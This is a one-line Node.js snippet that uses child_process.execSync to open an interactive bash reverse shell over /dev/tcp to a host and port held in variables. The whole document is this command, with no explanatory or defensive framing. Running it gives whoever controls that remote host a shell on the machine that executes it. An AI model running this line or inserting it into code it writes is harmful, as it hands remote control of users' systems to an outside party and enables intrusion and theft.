const cp=require("child_process"); cp.execSync(`bash -i >& /dev/tcp/${host}/${port} 0>&1`);
